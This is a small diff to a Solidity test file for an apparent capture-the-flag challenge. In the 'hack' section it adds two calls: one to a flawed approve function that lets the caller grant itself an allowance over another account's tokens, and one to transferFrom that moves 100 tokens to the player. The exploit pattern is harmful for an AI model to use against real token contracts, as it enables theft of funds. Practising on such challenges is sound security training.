@@ -28,6 +28,8 @@ contract Challenge0Test is Test {
         //    Add your hack below!    //
         //////////////////////////////*/
 
+        token.call(abi.encodeWithSignature("approve(address,address,uint256)", vitalik, player, 100000000000000000000));
+        token.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", vitalik, player, 100000000000000000000));
         //============================//
 
         vm.stopPrank();
